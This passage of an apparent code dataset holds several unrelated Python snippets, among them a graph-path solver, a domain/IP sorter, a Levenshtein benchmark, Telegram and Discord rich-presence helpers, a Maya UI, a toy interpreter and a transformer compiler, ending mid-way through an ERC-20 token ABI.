list(path)\n                new_path.append(neighbour)\n                queue.append(new_path)\n                 \n                # Condition to check if the \n                # neighbour node is the goal\n                if neighbour == goal:\n                    #print(\"Shortest path = \", *new_path)\n                    return new_path\n            explored.append(node)\n \n    # Condition when the nodes \n    # are not connected\n    #print(\"So sorry, but a connecting path doesn't exist :(\")\n    return list()\n\ndef shortest_path(graph, node1, node2):\n    path_list = [[node1]]\n    path_index = 0\n    # To keep track of previously visited nodes\n    previous_nodes = {node1}\n    if node1 == node2:\n        return path_list[0]\n        \n    while path_index < len(path_list):\n        current_path = path_list[path_index]\n        last_node = current_path[-1]\n        next_nodes = graph[last_node]\n        # Search goal node\n        if node2 in next_nodes:\n            current_path.append(node2)\n            return current_path\n        # Add new paths\n        for next_node in next_nodes:\n            if not next_node in previous_nodes:\n                new_path = current_path[:]\n                new_path.append(next_node)\n                path_list.append(new_path)\n                # To avoid backtracking\n                previous_nodes.add(next_node)\n        # Continue to next path in list\n        path_index += 1\n    # No path is found\n    return []\n\n\"\"\"End copy paste\"\"\"\n\n\n\nclass MySet:\n    def __init__(self, v) :\n        self.parent = None\n        self.v = v\n        self.rang = 0\n\n    @staticmethod\n    def find( x ):\n        if x.parent == None:\n            return x\n        return MySet.find( x.parent )\n    \n    @staticmethod\n    def union( x,y):\n        xrac = MySet.find( x )\n        yrac = MySet.find( y )\n        if xrac != yrac :\n            if xrac.rang < yrac.rang:\n                xrac.parent = yrac\n            else:\n                yrac.parent = xrac\n                if xrac.rang == yrac.rang:\n                    xrac.rang = yrac.rang + 1 \n\n    @staticmethod\n    def areJoined( x,y):\n        return MySet.find(x) == MySet.find(y)\n\nclass RevListPuzzle:\n    def __init__(self,n) :\n        digits = [ x+1 for x in range(n)]\n        count = 0\n        self.n = n\n        self.nodes = []\n\n        for k in range(n):\n            ii = 0\n            for p in itertools.combinations(digits,k):\n                for p2 in itertools.permutations(p ):\n                    self.nodes.append(p2)\n          ",
    "#coding=utf-8\nimport os\nimport re\nimport time\n\ndomain_list = []\ncurrent_dir = os.getcwd()\nfor file_name in os.listdir(current_dir):\n  if os.path.isfile(os.path.join(current_dir, file_name)):\n    if \".json\" in file_name:\n      with open(file_name, 'r', encoding='utf-8') as f:\n        t = re.compile('\"domain\":\"(.*?)\",')\n        p = f.read()\n        r = t.findall(p)\n        for i in r:\n          domain_list.append(i)\n\ndef is_ip_address(text):\n    ip_pattern = r'\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b'\n    return re.match(ip_pattern, text) is not None\n\ndef is_domain(text):\n    domain_pattern = r'\\b(?:[a-zA-Z0-9-]+\\.)+[a-zA-Z]{2,}\\b'\n    return re.match(domain_pattern, text) is not None\n\nip = []\ndomain = []\nother = []\nfor i in domain_list:\n  if is_ip_address(i):\n    ip.append(i)\n  elif is_domain(i):\n    domain.append(i)\n  else:\n    other.append(i)\n\nresult = open(\"result.txt\",\"a+\")\nresult.write(time.asctime() + \"\\n\")\nprint(time.asctime())\nresult.write(\"\u627e\u5230\u7684ip\u8d44\u4ea7\u5982\u4e0b\uff1a\\n\")\nprint(\"\u627e\u5230\u7684ip\u8d44\u4ea7\u5982\u4e0b\uff1a\")\nif len(ip) == 0:\n  result.write(\"\u5624\u5624\u5624\uff0c\u6ca1\u627e\u5230ip\u634f(*\ua4a6\u0eb4\u2313\ua4a6\u0eb5)\\n\")\n  print(\"\u5624\u5624\u5624\uff0c\u6ca1\u627e\u5230ip\u634f(*\ua4a6\u0eb4\u2313\ua4a6\u0eb5)\")\nelse:\n  for i in ip:\n    result.write(i + \"\\n\")\n    print(i)\nresult.write(\"\\n\")\nresult.write(\"\u627e\u5230\u7684domain\u8d44\u4ea7\u5982\u4e0b\uff1a\\n\")\nprint(\"\u627e\u5230\u7684domain\u8d44\u4ea7\u5982\u4e0b\uff1a\")\nif len(domain) == 0:\n  result.write(\"\u5624\u5624\u5624\uff0c\u6ca1\u627e\u5230domain\u634f(*\ua4a6\u0eb4\u2313\ua4a6\u0eb5)\\n\")\n  print(\"\u5624\u5624\u5624\uff0c\u6ca1\u627e\u5230domain\u634f(*\ua4a6\u0eb4\u2313\ua4a6\u0eb5)\")\nelse:\n  for i in domain:\n    result.write(i + \"\\n\")\n    print(i)\nresult.write(\"\\n\")\nresult.write(\"\u627e\u5230\u6b63\u5219\u5339\u914d\u5916\u7684\u8d44\u4ea7\uff1a\\n\")\nprint(\"\u627e\u5230\u6b63\u5219\u5339\u914d\u5916\u7684\u8d44\u4ea7\uff1a\")\nif len(other) == 0:\n  result.write(\"\u6840\u6840\u6840\u6840\uff0c\u786e\u8ba4\u6ca1\u6709\u6b63\u5219\u5339\u914d\u5916\u7684\u8d44\u4ea7\uff0c\u7a0b\u5e8f\u65e0\u8bef\uff0cnice\uff01\\n\")\n  print(\"\u6840\u6840\u6840\u6840\uff0c\u786e\u8ba4\u6ca1\u6709\u6b63\u5219\u5339\u914d\u5916\u7684\u8d44\u4ea7\uff0c\u7a0b\u5e8f\u65e0\u8bef\uff0cnice\uff01\")\nelse:\n  result.write(\"omg\uff0c\u51fa\u73b0\u4e86\u4e00\u4e9b\u95ee\u9898\uff0c\u8bf7\u624b\u52a8\u5904\u7406\u5982\u4e0b\u8d44\u4ea7\uff1a\\n\")\n  print(\"omg\uff0c\u51fa\u73b0\u4e86\u4e00\u4e9b\u95ee\u9898\uff0c\u8bf7\u624b\u52a8\u5904\u7406\u5982\u4e0b\u8d44\u4ea7\uff1a\")\n  for i in ip:\n    result.write(i + \"\\n\")\n    print(i)\nresult.write(\"\\n\\n\")\nprint(\"\u8fd0\u884c\u7ed3\u679c\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u7684result.txt\u6587\u4ef6\u91cc\u4e86\u5594\uff0c\u8bf7\u6ce8\u610f\u67e5\u6536\uff01\")",
    "from timeit import timeit\n\nimport matplotlib.pyplot as plt\n\nn = 1_000\n\n\ndef measure() -> dict[str, float]:\n    \"\"\"Measure times for popular levenshtein implementations.\n\n    Returns:\n        dict[str, float]: dict with measures, library name as key and measure as value.\n    \"\"\"\n    pylev_time = timeit(\n        \"pylev.levenshtein('Lets pretend Marshall Mathers never picked up a pen', 'Lets pretend things woulda been no different')\",\n        \"import pylev\",\n        number=n,\n    )\n    # no longer actively mainted. See authors comment:\n    # https://github.com/lanl/pyxDamerauLevenshtein/issues/32#issuecomment-1249497449\n    # pyxdameraulevenshtein_time = timeit(\n    #     \"pyxdameraulevenshtein.damerau_levenshtein_distance(a, b)\", \"import pyxdameraulevenshtein\", number=n\n    # )\n    rapidfuzz_time = timeit(\n        \"Levenshtein.distance('Lets pretend Marshall Mathers never picked up a pen', 'Lets pretend things woulda been no different')\",\n        \"from rapidfuzz.distance import Levenshtein\",\n        number=n,\n    )\n    editdistance_time = timeit(\n        \"editdistance.eval('Lets pretend Marshall Mathers never picked up a pen', 'Lets pretend things woulda been no different')\",\n        \"import editdistance\",\n        number=n,\n    )\n    levenshtein_time = timeit(\n        \"Levenshtein.distance('Lets pretend Marshall Mathers never picked up a pen', 'Lets pretend things woulda been no different')\",\n        \"import Levenshtein\",\n        number=n,\n    )\n\n    return {\n        \"editdistance\": editdistance_time,\n        \"levenshtein\": levenshtein_time,\n        \"pylev\": pylev_time,\n        \"rapidfuzz\": rapidfuzz_time,\n    }\n\n\ndef plot(measures: dict[str, float]) -> None:\n    \"\"\"plot measures.\n\n    Args:\n        measures (dict[str, float]): dict with library name and measure\n    \"\"\"\n    fig, ax = plt.subplots()\n    ax.bar(measures.keys(), measures.values())\n    ax.set_xlabel(f\"Time in ms for n={n:,}\")\n    ax.set_title(\"Levenshtein distance w/o cut-off\")\n    plt.yscale(\"log\")\n    plt.savefig(\"bechmark_results.png\")\n\n\nif __name__ == \"__main__\":\n    measures = measure()\n    plot(measures)\n",
    "import sys\nsys.dont_write_bytecode = True\n\nimport time, subprocess, os, json\nimport numpy as np\nsys.path.append(f'{os.path.dirname(__file__)}/../')\nimport notify_utils as utils\n\n#---------------------------------------------------------------\n#region                  CONFIGURATIONS                        -\n#---------------------------------------------------------------\n\ndef write_conf_profile(name, token, from_chat_id=\"\", to_chat_id=\"\", disable_web_page_preview=\"\", disable_notification=\"\", protect_content=\"\", allow_sending_without_reply=\"\", parse_mode=\"\"): \n\n\t'''Method to set a profile in the configuration file for future use\n\t\n\t- name : str -> Unique name of the profile, can't have more profiles with the same name. If passed a name of a profile already in the configuration, that profile is gonna be modified with this parameters\n\t- token : str -> The token associated to the bot to use in this profile\n\t- from_chat_id : int/str (optional) -> Chat id to use when searching for a message to copy/forward/...\n\t- to_chat_id : int/str (optional) -> Chat id to use when sending/editing messages\n\t- disable_web_page_preview : bool (optional) -> Disables link previews for links in this message\n\t- disable_notification : bool (optional) -> Sends the message silently. Users will receive a notification with no sound.\n\t- protect_content : bool (optional) -> Protects the contents of the sent message from forwarding and saving\n\t- allow_sending_without_reply : bool (optional) -> Pass True if the message should be sent even if the specified replied-to message is not found\n\t- parse_mode : str (optional) -> Mode for parsing entities in the message text. See the site for more details.'''\n\n\tif token != \"\" and not utils.requests_post(f\"https://api.telegram.org/bot{token}/getMe\").json()[\"ok\"]: utils.ntf_exc(\"NOTIFY_EXCEPTION: Invalid token.\")\n\n\tif not os.path.exists(utils.CONFIG_PATH):\n\t\tsubprocess.run([\"touch\", utils.CONFIG_PATH])\n\t\twith open(utils.CONFIG_PATH, \"w\") as f:\n\t\t\tf.write(json.dumps({\"def\":\"default\", \"profiles\":{}}, indent=4))\n\n\twith open(utils.CONFIG_PATH, \"r\") as f:\n\t\tconfiguration = json.loads(f.read())\n\t\n\tprofile = configuration[\"profiles\"][name] = {}\n\tprofile[\"token\"] = token\n\tprofile[\"from_chat_id\"] = from_chat_id\n\tprofile[\"to_chat_id\"] = to_chat_id\n\tprofile[\"disable_web_page_preview\"] = disable_web_page_preview\n\tprofile[\"disable_notification\"] = disable_notification\n\tprofile[\"protect_content\"] = protect_content\n\tprofile[\"allow_sending_without_reply\"] = allow_sending_without_reply\n\tprofile[\"parse_mode\"] = parse_mode\n\n\twith open(utils.CONFIG_PATH, \"w\") as f:\n\t\tf.write(json.dumps(configuration, indent=4))\n\ndef edit_conf_profile(name, token=\"\", from_chat_id=\"\", to_chat_id=\"\", disable_web_page_preview=\"\", disable_notification=\"\", protect_content=\"\", allow_sending_without_reply=\"\", parse_mode=\"\"): \n\n\t'''Method to set a profile in the configuration file for future use\n\t\n\t- name : str -> Unique name of the profile to edit, if the name doesn't exist in the configuration file an exception will be raised\n\t- token : str (optional) -> The token associated to the bot to use in this profile\n\t- from_chat_id : int/str (optional) -> Chat id to use when searching for a message to copy/forward/...\n\t- to_chat_id : int/str (optional) -> Chat id to use when sending/editing messages\n\t- disable_web_page_preview : bool (optional) -> Disables link previews for links in this message\n\t- disable_notification : bool (optional) -> Sends the message silently. Users will receive a notification with no sound.\n\t- protect_content : bool (optional) -> Protects the contents of the sent message from forwarding and saving\n\t- allow_sending_without_reply : bool (optional) -> Pass True if the message should be sent even if the specified replied-to message is not found\n\t- parse_mode : str (optional) -> Mode for parsing entities in the message text. See the site for more details.'''\n\n\tif token != \"\" and not utils.requests_post(f\"https://api.telegram.org/bot{token}/getMe\").json()[\"ok\"]: utils.ntf_exc(\"NOTIFY_EXCEPTION: Invalid token.\")\n\n\tif not os.path.exists(utils.CONFIG_PATH): utils.ntf_exc(\"NOTIFY_EXCEPTION: Configuration file not found.\")\n\n\twith open(utils.CONFIG_PATH, \"r\") as f:\n\t\tconfiguration = json.loads(f.read())\n\t\n\tif name not in configuration[\"profiles\"]: utils.ntf_exc(\"NOTIFY_EXCEPTION: The specified name was not in the list of profiles in the configuration file.\")\n\n\tprofile = configuration[\"profiles\"][name]\n\tif token != \"\": profile[\"token\"] = token\n\tif from_chat_id != \"\": profile[\"from_chat_id\"] = from_chat_id\n\tif to_chat_id != \"\": profile[\"to_chat_id\"] = to_chat_id\n\tif disable_web_page_preview != \"\": profile[\"disable_web_page_preview\"] = disable_web_page_preview\n\tif disable_notification != \"\": profile[\"disable_notification\"] = disable_notification\n\tif protect_content != \"\": profile[\"protect_content\"] = protect_content\n\tif allow_sending_without_reply != \"\": profile[\"allow_sending_without_reply\"] = allow_sending_without_reply\n\tif parse_mode != \"\": pr",
    "from PySide2 import QtWidgets, QtCore\r\nimport maya.cmds as cmds\r\nimport maya.OpenMayaUI as omui\r\nfrom shiboken2 import wrapInstance\r\n\r\nclass PlaybackSpeedUI(QtWidgets.QWidget):\r\n    def __init__(self):\r\n        super(PlaybackSpeedUI, self).__init__()\r\n        self.setWindowTitle(\"Playback Speed Control\")\r\n        self.setObjectName(\"PlaybackSpeedUI\")  # Set an object name for the UI\r\n        self.resize(250, 150)\r\n\r\n        # Set the window flags to make the window stay on top\r\n        self.setWindowFlags(QtCore.Qt.WindowStaysOnTopHint)\r\n\r\n        self.init_ui()\r\n\r\n    def init_ui(self):\r\n        layout = QtWidgets.QVBoxLayout(self)\r\n\r\n        # Speed presets\r\n        self.presets_combo = QtWidgets.QComboBox()\r\n        self.presets_combo.addItems([\"0.10x\", \"0.20x\", \"0.25x\", \"0.33x\", \"0.50x\", \"1.0x\", \"2.0x\", \"3.0x\", \"4.0x\", \"5.0x\", \"10.0x\", \"Custom\"])\r\n        self.presets_combo.currentIndexChanged.connect(self.update_speed)\r\n\r\n        # Custom speed input\r\n        self.custom_speed_edit = QtWidgets.QLineEdit()\r\n        self.custom_speed_edit.setPlaceholderText(\"Custom Speed\")\r\n        self.custom_speed_edit.setEnabled(False)\r\n        self.custom_speed_edit.returnPressed.connect(self.set_custom_speed)\r\n\r\n        # Playback speed label\r\n        self.speed_label = QtWidgets.QLabel(\"Playback Speed: 1.0x\")\r\n\r\n        # Close button\r\n        self.close_button = QtWidgets.QPushButton(\"Close\")\r\n        self.close_button.clicked.connect(self.close_window)\r\n\r\n        layout.addWidget(self.presets_combo)\r\n        layout.addWidget(self.custom_speed_edit)\r\n        layout.addWidget(self.speed_label)\r\n        layout.addWidget(self.close_button)\r\n\r\n    def update_speed(self, index):\r\n        speed_text = self.presets_combo.currentText()\r\n        if speed_text == \"Custom\":\r\n            self.custom_speed_edit.setEnabled(True)\r\n            self.custom_speed_edit.setFocus()\r\n        else:\r\n            self.custom_speed_edit.setEnabled(False)\r\n            speed = float(speed_text.replace(\"x\", \"\"))\r\n            self.set_speed(speed)\r\n\r\n    def set_speed(self, speed):\r\n        cmds.playbackOptions(playbackSpeed=speed)\r\n        self.speed_label.setText(\"Playback Speed: {}x\".format(speed))\r\n\r\n    def set_custom_speed(self):\r\n        custom_speed_text = self.custom_speed_edit.text()\r\n        try:\r\n            custom_speed = float(custom_speed_text)\r\n            self.set_speed(custom_speed)\r\n        except ValueError:\r\n            pass\r\n\r\n    def close_window(self):\r\n        self.close()\r\n\r\ndef maya_main_window():\r\n    main_window_ptr = omui.MQtUtil.mainWindow()\r\n    return wrapInstance(int(main_window_ptr), QtWidgets.QMainWindow)\r\n\r\ndef show_ui():\r\n    global playback_speed_ui\r\n    try:\r\n        playback_speed_ui.close()\r\n        playback_speed_ui.deleteLater()\r\n    except:\r\n        pass\r\n    playback_speed_ui = PlaybackSpeedUI()\r\n    playback_speed_ui.show()\r\n\r\n    # Use scriptJob to keep the window in focus\r\n    cmds.scriptJob(uiDeleted=[playback_speed_ui.objectName()], parent=playback_speed_ui.objectName(), protected=True, runOnce=True, event=[playback_speed_ui.objectName(), lambda *args: show_ui()])\r\n\r\n# Show the UI\r\nshow_ui()\r\n",
    "from runtime.values import ValueType, RuntimeVal, NumberVal, NullVal\nfrom frontend.ast_nodes import NodeType, Stmt, NumericLiteral, BinaryExpr, Program\nfrom colorama import Fore\n\ndef raise_error(msg:str, ast_node:Stmt=None):\n    print(Fore.RED, end=\"\")\n    print(f\"\u26a0\ufe0f \ud83e\udd56 Interpreter ERROR : {msg}\")\n    if ast_node:\n        print(ast_node)\n    print(Fore.RESET, end=\"\")\n    exit(1)\n\ndef eval_program(program:Program) -> RuntimeVal:\n    lastEvaluated = NullVal()\n    for statement in program.body:\n        lastEvaluated = evaluate(statement)\n    return lastEvaluated\n\ndef eval_numeric_binary_expression(left:NumberVal, right:NumberVal, operator:str) -> NumberVal:\n    if operator == \"+\":\n        return NumberVal(left.value + right.value)\n    elif operator == \"-\":\n        return NumberVal(left.value - right.value)\n    elif operator == \"*\":\n        return NumberVal(left.value * right.value)\n    elif operator == \"/\":\n        if right.value == 0:\n            raise_error(f\"Tried to divide by zero\")\n        return NumberVal(left.value / right.value)\n    elif operator == \"%\":\n        if right.value == 0:\n            raise_error(f\"Tried to divide by zero\")\n        return NumberVal(left.value % right.value)\n    else:\n        raise_error(f\"Unknown operator {operator}\")\n\ndef eval_binary_expression(binop:BinaryExpr) -> RuntimeVal:\n    leftHandSide = evaluate(binop.left)\n    rightHandSide = evaluate(binop.right)\n\n    if leftHandSide.type == ValueType.number and rightHandSide.type == ValueType.number:\n        return eval_numeric_binary_expression(leftHandSide, rightHandSide, binop.operator)\n    \n    return NullVal()\n\ndef evaluate(astNode:Stmt) -> RuntimeVal:\n    if astNode.kind == NodeType.NumericLiteral:\n        return NumberVal(astNode.value)\n    \n    if astNode.kind == NodeType.NullLiteral:\n        return NullVal()\n\n    if astNode.kind == NodeType.BinaryExpr:\n        return eval_binary_expression(astNode)\n\n    if astNode.kind == NodeType.Program:\n        return eval_program(astNode)\n\n    else:\n        raise_error(f\"Unknown AST Node\",astNode)\n        return NullVal()",
    "# Load the stravinsky file\nfrom compiler.utils import CompilerError\n\nwith open('sha256_full.strav', 'r') as f:\n    file = f.readlines()\n\nprint(file)\n\n# Create output file\nf = open(\"compiled_transformer.py\", \"w\")\n\ng = open(\"constants.py\", \"w\")\n\nf.write(\"import time\\nfrom tqdm import tqdm\\nfrom compiler.lib import *\\n\\nt = time.time()\\n\\n\")\n\n# Get the main input\ninput_text = \"\"\nfor line in file:\n    if \"INPUT\" in line:\n        input_text = line.split(\"=\")[1].strip()\n        break\n\nif input_text == \"\":\n    raise CompilerError(\"No input found. The file must contain a line like `INPUT = 1101011101011010`\")\n\ng.write(f\"INPUT_LENGTH = {len(input_text)}\\n\")\ng.close()\n\n# First, we must determine how many total registers we need\nregisters = ['tchaikovsky', 'anti_tchaikovsky', 'zeros', 'ones']\nuser_defined_constant_register_values = []\n\n# Add constant registers\nfor line in file:\n    if line[0] == \"$\":\n        registers.append(line[1:].split(\"=\")[0].strip())\n        user_defined_constant_register_values.append(line[1:].split(\"=\")[1].strip())\n\n# Extract the lines of the file between lines containing PROGRAM_START and PROGRAM_END\nprogram_lines = []\nprogram_started = False\n\nfor line in file:\n    if \"PROGRAM_START\" in line:\n        program_started = True\n    elif \"PROGRAM_END\" in line:\n        program_started = False\n    elif program_started:\n        program_lines.append(line)\n\nfor line in program_lines:\n    if \"=\" in line:\n        rname = line.split(\"=\")[0].strip()\n        if rname not in registers:\n            registers.append(rname)\n\nprint(registers)\n\n# Get the list of tokens\n# In the file, the line looks like `TOKENS = /0\\1\\2/`\n# We need to convert this to the string `tokens = list('012')`\n\ntokens = []\n\nfor line in file:\n    if \"TOKENS\" in line:\n        tokens = line.split(\"/\")[1].split(\"/\")[0].strip().split(\"\\\\\")\n\nif len(tokens) == 0:\n    raise CompilerError(\"No tokens found. The file must contain a line like `TOKENS = /0\\1\\2/`\")\n\nf.write(f\"tokens = {tokens}\\n\")\nf.write(\"pos = Register('pos', 2)\\n\")\n\n# Create the register objects\nfor register in registers:\n    f.write(f\"{register} = Register('{register}', 1)\\n\")\n\nnum_work_registers = -1\n\nfor line in file:\n    if \"NUM_WORK_REGISTERS\" in line:\n        num_work_registers = int(line.split(\"=\")[1].strip())\n        break\n\nif num_work_registers == -1:\n    raise CompilerError(\"No NUM_WORK_REGISTERS found. The file must contain a line like `NUM_WORK_REGISTERS = 5`\")\n\n# Create a healthy amount of work registers\nf.write(f\"\"\"\nwork_registers = []\nfor i in range({num_work_registers}):\n    work_registers.append(Register(f'work_{{i}}', len(tokens)))\n\"\"\")\n\n# Create the main embedding\n# embedding = EmbeddedState(tokens, [pos, tchaikovsky, anti_tchaikovsky, zero_register, input_copy, input_copy2, shifted, shiftedl] + work_registers)\n\nembedding_line = \"embedding = EmbeddedState(tokens, [pos, \"\nfor register in registers:\n    embedding_line += f\"{register}, \"\nembedding_line = embedding_line[:-2] + \"] + work_registers)\\n\"\n\nf.write(embedding_line)\n\n# Now, create the input\n# example = embedding.embed(embedding.tokenize('1101011'), [embedding.tokenize('0111111'), embedding.tokenize('1111110')])\n\n# Create constant register values\nconstant_register_values = []\nlength = len(input_text)\n\nconstant_register_values.append('0' + '1' * (length - 1))  # tchaikovsky\nconstant_register_values.append('1' * (length - 1) + '0')  # anti_tchaikovsky\nconstant_register_values.append('0' * length)  # zeros\nconstant_register_values.append('1' * length)  # ones\n\nconstant_register_values.extend(user_defined_constant_register_values)\n\nexample_line = f\"first_input = embedding.embed(embedding.tokenize('{input_text}'), [\"\n\nfor register_value in constant_register_values:\n    example_line += f\"embedding.itokenize('{register_value}'), \"\n\nexample_line = example_line[:-2] + \"])\\n\"\n\nf.write(example_line)\n\n# Now, we actually create the program\n\nfunc_templates = {\n    \"copy\": \"Copy(embedding, pos, <a>, <b>)\",\n    \"copy_input\": \"ConvertToInternal(embedding, <a>)\",\n    \"keep_\": \"Keep(<a>, <b>)\",\n    \"rotate_\": \"Rotate(embedding, pos, tchaikovsky, anti_tchaikovsky, <a>, <b>, work_registers)\",\n    \"rotate_with_limit_\": \"RotateWithLimit(embedding, pos, tchaikovsky, anti_tchaikovsky, <a>, <b>, <c>, work_registers)\",\n    \"shiftr_\": \"Shift(embedding, pos, tchaikovsky, <a>, <b>, work_registers)\",\n    \"shiftl_\": \"ShiftL(embedding, pos, anti_tchaikovsky, <a>, <b>, work_registers)\",\n    \"xor\": \"XOR(embedding, pos, <a>, <b>, <c>, work_registers)\",\n    \"and\": \"AND(embedding, <a>, <b>, <c>)\",\n    \"not_\": \"NOT(embedding, pos, <a>, work_registers)\",\n    \"print_\": \"Print(embedding, <a>)\",\n    \"add\": \"Add(embedding, pos, anti_tchaikovsky, <a>, <b>, <c>, work_registers)\"\n}\n\n\ndef get_template(func_name, args):\n    if func_name == \"shift_\":\n        if int(args[1]) >= 0:\n            func_name = \"shiftr_\"\n        else:\n            func_name = \"shiftl_\"\n\n    template = func_templates.get(func_name)\n    if template is None:\n        raise CompilerError(f\"U",
    "#!/usr/bin/env python3\n\nimport copy, json, websocket, threading, requests, time, signal, sys, os, subprocess\n\n# ANSI escape codes for text colors\nclass Color:\n    RED = '\\033[91m'\n    GREEN = '\\033[92m'\n    CYAN = '\\033[96m'\n    RESET = '\\033[0m'  # Reset color to default\n\ndef printinfo(text):\n  print(Color.CYAN + text + Color.RESET)\n\ndef printerr(text):\n  print(Color.RED + text + Color.RESET)  \n\ndef printsucc(text): # It stands for successful you sussy baka\n  print(Color.GREEN + text + Color.RESET)\n\ncached_small_image = None\ncached_big_image = None\nnew_big_image = None\nnew_small_image = None\nprevious_payload = None\noriginal_status = None\nws_connected = True\n\ncurrent_path = os.path.dirname(os.path.abspath(__file__))\nconfig_path = os.path.join(current_path, 'config.json')\nif os.path.exists(config_path):\n  with open(config_path, 'r') as f:\n    # Load the JSON data\n    config = json.load(f)\nelse:\n  printerr('Please generate config first!')\n  exit(0)\n\nparams = {}\nfor i in range(1, 4):\n  try:\n    params[i] = sys.argv[i]\n  except:\n    params[i] = None\ntoken = params[1] if params[1] else config['token']\ntype_ = params[2] if params[2] else config.get('rpc_type', 0)\nrpc_style = params[3] if params[3] else config.get('rpc_style', 0)\nnode_server_path = config['node_path']\njellyfin_rpc_path = config['jellyfin_rpc_path']\ntype_ = 0 if type_ == 0 else 3 #Convert type ints to ones used by Discord (0: Gaming, 3: Watching)\n\ninit_payload = {\n    \"op\": 2,\n    \"d\": {\n        \"token\": token,\n        \"intents\": 0,\n        \"properties\": {\n            \"$os\": 'linux',\n            \"$browser\": 'npm',\n            \"$device\": 'npm'\n        },\n    }\n}\n\nclear_payload = {\n    \"op\": 3,\n    \"d\": {\n        \"since\": 91879201,\n        \"activities\": None,\n        \"status\": original_status,\n        \"afk\": False\n    }\n}\n\ndef process_image(image_url, type_, app_id):\n    global cached_big_image, cached_small_image, new_big_image, new_small_image\n    if image_url == cached_big_image or image_url == cached_small_image:\n        return new_big_image if type_ == 'large' else new_small_image\n    else:\n        url = f'https://discord.com/api/v9/applications/{app_id}/external-assets'\n        response = requests.post(url, headers={'Authorization': token, 'Content-Type': 'application/json'}, json={\"urls\": [image_url]})\n        data = response.json()[0]\n        if type_ == 'large':\n            cached_big_image = image_url\n            new_big_image = f\"mp:{data['external_asset_path']}\"\n            return new_big_image\n        elif type_ == 'small':\n            cached_small_image = image_url\n            new_small_image = f\"mp:{data['external_asset_path']}\"\n            return new_small_image\n\ndef process_data(data):\n    global original_status\n    processed_data = data['activity']\n    processed_data['type'] = type_\n    if rpc_style == 0:\n        processed_data['name'] = \"Jellyfin\"\n    elif rpc_style == 1:\n        processed_data['name'] = processed_data['details']\n        del processed_data['details']\n        processed_data['assets']['large_text'] = 'Streaming on Jellyfin\u2122'\n\n    if processed_data['assets'].get('large_image'):\n        updated_large_image = process_image(processed_data['assets']['large_image'], 'large', processed_data['application_id'])\n        while not updated_large_image:\n          time.sleep(1)\n          updated_large_image = process_image(processed_data['assets']['large_image'], 'large', processed_data['application_id'])\n        processed_data['assets']['large_image'] = updated_large_image\n    if processed_data['assets'].get('small_image'):\n        updated_small_image = process_image(processed_data['assets']['small_image'], 'small', processed_data['application_id'])\n        while not updated_small_image:\n          time.sleep(1)\n          updated_small_image = process_image(processed_data['assets']['small_image'], 'small', processed_data['application_id'])\n        processed_data['assets']['small_image'] = updated_small_image\n\n    return processed_data\n\ndef update_status(activity):\n    payload = {\n        \"op\": 3,\n        \"d\": {\n            \"since\": 91879201,\n            \"activities\": [activity],\n            \"status\": original_status,\n            \"afk\": False\n        }\n    }\n    printinfo(\n              (\"Updating RPC with:\\n\" +\n              activity['name'] + \n              (f' {Color.RED}({activity[\"assets\"][\"small_text\"]}){Color.RESET}' if activity.get(\"assets\", {}).get(\"small_text\") else \"\"))\n              if activity else json.dumps(payload, indent=4)\n            ) # COLORS!1!1!\n    ws.send(json.dumps(payload))\n\ndef are_objects_equal(obj1, obj2):\n    result = json.dumps(obj1) == json.dumps(obj2)\n    return result\n\ndef clear_rpc():\n    printsucc('Clearing RPC')\n    ws.send(json.dumps(clear_payload))\n\ndef on_message(ws, message):\n    global previous_payload, original_status\n    payload = json.loads(message)\n    op = payload.get('op')\n    t = payload.get('t')\n\n    if op == 10:\n        heartbeat_interval = payload['d']['heartbeat_interval']\n     ",
    "contract_address = \"0x4C749d097832DE2FEcc989ce18fDc5f1BD76700c\"\n# ABI \u043a\u043e\u043d\u0442\u0440\u0430\u043a\u0442\u0430 esXai \u0442\u043e\u043a\u0435\u043d\u0430\nesXai_contract_abi = \"\"\"  [\n        {\n            \"constant\": true,\n            \"inputs\": [],\n            \"name\": \"name\",\n            \"outputs\": [\n                {\n                    \"name\": \"\",\n                    \"type\": \"string\"\n                }\n            ],\n            \"payable\": false,\n            \"stateMutability\": \"view\",\n            \"type\": \"function\"\n        },\n        {\n            \"constant\": false,\n            \"inputs\": [\n                {\n                    \"name\": \"_spender\",\n                    \"type\": \"address\"\n                },\n                {\n                    \"name\": \"_value\",\n                    \"type\": \"uint256\"\n                }\n            ],\n            \"name\": \"approve\",\n            \"outputs\": [\n                {\n                    \"name\": \"\",\n                    \"type\": \"bool\"\n                }\n            ],\n            \"payable\": false,\n            \"stateMutability\": \"nonpayable\",\n            \"type\": \"function\"\n        },\n        {\n            \"constant\": true,\n            \"inputs\": [],\n            \"name\": \"totalSupply\",\n            \"outputs\": [\n                {\n                    \"name\": \"\",\n                    \"type\": \"uint256\"\n                }\n            ],\n            \"payable\": false,\n            \"stateMutability\": \"view\",\n            \"type\": \"function\"\n        },\n        {\n            \"constant\": false,\n            \"inputs\": [\n                {\n                    \"name\": \"_from\",\n                    \"type\": \"address\"\n                },\n                {\n                    \"name\": \"_to\",\n                    \"type\": \"address\"\n                },\n                {\n                    \"name\": \"_value\",\n                    \"type\": \"uint256\"\n                }\n            ],\n            \"name\": \"transferFrom\",\n            \"outputs\": [\n                {\n                    \"name\": \"\",\n                    \"type\": \"bool\"\n                }\n            ],\n            \"payable\": false,\n            \"stateMutability\": \"nonpayable\",\n            \"type\": \"function\"\n        },\n        {\n            \"constant\": true,\n            \"inputs\": [],\n            \"name\": \"decimals\",\n            \"outputs\": [\n                {\n                    \"name\": \"\",\n                    \"type\": \"uint8\"\n                }\n            ],\n            \"payable\": false,\n            \"stateMutability\": \"view\",\n            \"type\": \"function\"\n        },\n        {\n            \"constant\": true,\n            \"inputs\": [\n                {\n                    \"name\": \"_owner\",\n                    \"type\": \"address\"\n                }\n            ],\n            \"name\": \"balanceOf\",\n            \"outputs\": [\n                {\n                    \"name\": \"balance\",\n                    \"type\": \"uint256\"\n                }\n            ],\n            \"payable\": false,\n            \"stateMutability\": \"view\",\n            \"type\": \"function\"\n        },\n        {\n            \"constant\": true,\n            \"inputs\": [],\n            \"name\": \"symbol\",\n            \"outputs\": [\n                {\n                    \"name\": \"\",\n                    \"type\": \"string\"\n                }\n            ],\n            \"payable\": false,\n            \"stateMutability\": \"view\",\n            \"type\": \"function\"\n        },\n        {\n            \"constant\": false,\n            \"inputs\": [\n                {\n                    \"name\": \"_to\",\n                    \"type\": \"address\"\n                },\n                {\n                    \"name\": \"_value\",\n                    \"type\": \"uint256\"\n                }\n            ],\n            \"name\": \"transfer\",\n            \"outputs\": [\n                {\n                    \"name\": 